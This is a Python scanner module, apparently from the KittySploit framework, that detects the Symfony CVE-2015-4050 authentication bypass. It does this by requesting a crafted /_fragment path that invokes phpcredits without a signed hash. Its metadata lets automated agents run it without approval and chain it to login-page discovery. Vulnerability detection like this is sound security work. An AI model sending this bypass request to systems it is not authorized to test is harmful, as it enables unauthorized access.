#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Symfony 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Symfony - Authentication Bypass Detection',
        'description': 'Symfony 2.3.19 through 2.3.28, 2.4.9 through 2.4.10, 2.5.4 through 2.5.11, and 2.6.0 through 2.6.7, when ESI or SSI support enabled, does not check if the _controller attribute is set, which allows remote attackers to bypass URL signing and security rules by including (1) no hash or (2) an invalid hash in a request to /_fragment in the HttpKernel component.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'symfony', 'rce', 'sensiolabs', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access',
            'http://symfony.com/blog/cve-2015-4050-esi-unauthorized-access',
            'http://www.debian.org/security/2015/dsa-3276',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-4050',
            'http://lists.fedoraproject.org/pipermail/package-announce/2015-June/159513.html',
        ],
        'cve': 'CVE-2015-4050',
    }

    def run(self):
        r = self.http_request(method="GET", path='/_fragment?_path=_controller=phpcredits&flag=-1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('PHP Credits',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Symfony - Authentication Bypass detected",
                path='/_fragment?_path=_controller=phpcredits&flag=-1',
            )
            return True
        return False

